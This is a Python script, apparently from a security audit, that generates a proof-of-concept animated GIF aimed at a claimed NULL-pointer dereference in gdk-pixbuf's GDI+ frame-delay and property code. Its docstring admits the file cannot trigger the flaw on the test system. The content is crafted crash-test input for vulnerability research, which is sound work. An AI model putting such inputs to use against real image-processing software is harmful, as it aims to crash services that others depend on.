#!/usr/bin/env python3
"""
vuln_002_gen.py
Generate a crafted animated GIF89a file (vuln_002.gif) that would theoretically
trigger VULN 002 (NULL pointer dereference via unchecked g_try_malloc in
gdip_bitmap_get_frame_delay / gdip_bitmap_get_n_loops / gdip_bitmap_get_property_as_string)
IF a GDI+ loader were present and OOM conditions existed.

NOTE: This file cannot actually trigger the vulnerability on the test system because:
  1. The Linux build of gdk-pixbuf here only supports the 'pixdata' format; there is
     no GDI+ / GIF loader compiled in.
  2. The root cause requires g_try_malloc to return NULL (OOM), which cannot be
     reliably forced via file content alone.

The generated file is a valid GIF89a animated file with:
  - NETSCAPE 2.0 Application Extension (loop count = 0 = infinite)
  - Multiple large frames (to create memory pressure)
  - Graphic Control Extensions with per-frame delay values
"""

import struct
import os

OUTPUT_PATH = os.path.join(os.path.dirname(os.path.abspath(__file__)), "vuln_002.gif")

# ---------------------------------------------------------------------------
# GIF helpers
# ---------------------------------------------------------------------------

def lzw_compress_flat(data: bytes, min_code_size: int) -> bytes:
    """Minimal LZW encoder that produces valid (though unoptimised) GIF sub-blocks."""
    clear_code = 1 << min_code_size
    eoi_code   = clear_code + 1

    code_size  = min_code_size + 1
    next_code  = eoi_code + 1
    table      = {bytes([i]): i for i in range(clear_code)}

    output_bits = []
    def emit(code: int, bits: int):
        for i in range(bits):
            output_bits.append((code >> i) & 1)

    emit(clear_code, code_size)

    buf = b""
    for byte in data:
        new_buf = buf + bytes([byte])
        if new_buf in table:
            buf = new_buf
        else:
            emit(table[buf], code_size)
            if next_code < 4096:
                table[new_buf] = next_code
                next_code += 1
                if next_code == (1 << code_size) and code_size < 12:
                    code_size += 1
            else:
                emit(clear_code, code_size)
                code_size  = min_code_size + 1
                next_code  = eoi_code + 1
                table      = {bytes([i]): i for i in range(clear_code)}
            buf = bytes([byte])

    if buf:
        emit(table[buf], code_size)
    emit(eoi_code, code_size)

    # Pack bits into bytes (LSB first)
    raw = bytearray()
    for i in range(0, len(output_bits), 8):
        byte = 0
        for j, bit in enumerate(output_bits[i:i+8]):
            byte |= bit << j
        raw.append(byte)

    # Wrap in GIF sub-blocks (max 255 bytes each)
    result = bytearray()
    for offset in range(0, len(raw), 255):
        chunk = raw[offset:offset+255]
        result.append(len(chunk))
        result.extend(chunk)
    result.append(0x00)  # block terminator
    return bytes(result)


def build_color_table(n: int) -> bytes:
    """Build a simple grayscale colour table with n entries."""
    entries = []
    for i in range(n):
        v = (i * 255) // max(n - 1, 1)
        entries.append(bytes([v, v, v]))
    return b"".join(entries)


def graphic_control_extension(delay_cs: int, disposal: int = 1) -> bytes:
    """Graphic Control Extension; delay in centiseconds."""
    return struct.pack(
        "<BBBBHBB",
        0x21, 0xF9,  # extension introducer + GCE label
        0x04,        # block size
        (disposal & 0x07) << 3,  # packed flags
        delay_cs,    # delay in 1/100 s
        0x00,        # transparent colour index (not set)
        0x00,        # block terminator
    )


def image_descriptor(left: int, top: int, width: int, height: int,
                     local_ct: bool = False, ct_size_field: int = 0) -> bytes:
    packed = 0x00
    if local_ct:
        packed = 0x80 | ct_size_field
    return struct.pack("<BHHHHB",
                       0x2C,           # image separator
                       left, top,
                       width, height,
                       packed)


def netscape_extension(loop_count: int = 0) -> bytes:
    """NETSCAPE 2.0 application extension (loop count)."""
    app_block = (
        b"\x21\xFF"          # extension introducer + application label
        b"\x0B"              # block size = 11
        b"NETSCAPE2.0"       # application identifier + auth code
        b"\x03"              # sub-block size
        b"\x01"              # sub-block id (loop count)
        + struct.pack("<H", loop_count)  # loop count (0 = infinite)
        + b"\x00"            # block terminator
    )
    return app_block


# ---------------------------------------------------------------------------
# Build the GIF
# ---------------------------------------------------------------------------

WIDTH        = 320
HEIGHT       = 240
N_FRAMES     = 20          # enough frames to stress property-item allocation
DELAY_CS     = 10          # 10/100 s = 100 ms per frame
CT_SIZE_BITS = 7           # 2^(7+1) = 256 colours
N_COLORS     = 256
MIN_CODE_SZ  = 8

color_table = build_color_table(N_COLORS)

gif = bytearray()

# --- Header ---
gif += b"GIF89a"

# --- Logical Screen Descriptor ---
gif += struct.pack(
    "<HHBBB",
    WIDTH, HEIGHT,
    0x80 | (CT_SIZE_BITS & 0x07),  # global CT present, colour resolution, size
    0x00,   # background colour index
    0x00,   # pixel aspect ratio
)

# --- Global Colour Table ---
gif += color_table

# --- NETSCAPE 2.0 loop extension (loop_count=0 → infinite) ---
gif += netscape_extension(loop_count=0)

# --- Frames ---
for frame_idx in range(N_FRAMES):
    # Graphic Control Extension with per-frame delay
    gif += graphic_control_extension(delay_cs=DELAY_CS + frame_idx, disposal=2)

    # Image Descriptor (no local CT; use global CT)
    gif += image_descriptor(0, 0, WIDTH, HEIGHT)

    # Image Data
    # Use a simple repeating pattern so LZW runs fast
    row_colour = frame_idx % N_COLORS
    pixel_data = bytes([row_colour] * (WIDTH * HEIGHT))
    gif += bytes([MIN_CODE_SZ])
    gif += lzw_compress_flat(pixel_data, MIN_CODE_SZ)

# --- Trailer ---
gif += b"\x3B"

with open(OUTPUT_PATH, "wb") as f:
    f.write(gif)

print(f"[vuln_002_gen.py] Written {len(gif)} bytes → {OUTPUT_PATH}")
print(f"  Frames  : {N_FRAMES}")
print(f"  Size    : {WIDTH}x{HEIGHT}")
print(f"  Loop ext: NETSCAPE2.0 loop_count=0 (infinite)")
